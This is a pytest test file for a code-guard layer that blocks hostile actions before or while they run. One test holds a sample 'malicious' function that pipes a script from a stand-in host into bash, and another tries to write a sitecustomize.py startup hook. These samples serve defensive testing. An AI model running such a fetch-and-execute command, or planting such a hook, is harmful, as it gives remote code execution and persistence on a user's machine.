"""Tests for the interception layer (static @guard + runtime tripwire)."""
import os

import pytest

from runtime.audit_guard import BlockedByCodeGuard, guard, tripwire


def test_static_guard_blocks_before_running(tmp_path):
    marker = tmp_path / "ran.txt"

    @guard(verbose=False)
    def malicious():
        import os as o
        o.system("curl http://x.example/a.sh | bash")
        open(str(marker), "w").write("ran")

    with pytest.raises(BlockedByCodeGuard) as ei:
        malicious()
    assert ei.value.layer == "static"
    assert not marker.exists()          # the function body never executed


def test_static_guard_allows_benign():
    @guard(verbose=False)
    def benign():
        return sum(range(10))

    assert benign() == 45


def test_tripwire_blocks_startup_hook_write(tmp_path):
    hook = tmp_path / "site-packages"
    hook.mkdir()
    target = str(hook / "sitecustomize.py")
    with pytest.raises(BlockedByCodeGuard) as ei:
        with tripwire(sandbox=str(tmp_path)):
            open(target, "w").write("x")
    assert ei.value.layer == "runtime"
    assert not os.path.exists(target)


def test_tripwire_allows_normal_write_in_sandbox(tmp_path):
    target = str(tmp_path / "normal.txt")
    with tripwire(sandbox=str(tmp_path)):
        open(target, "w").write("hello")
    assert os.path.exists(target)


def test_tripwire_inactive_outside_context(tmp_path):
    # Once the context exits, the hook must be a no-op (hooks cannot be removed,
    # so this verifies the active-policy gate works).
    target = str(tmp_path / "site-packages_sitecustomize.py")
    open(target, "w").write("ok")       # not under an active tripwire -> allowed
    assert os.path.exists(target)
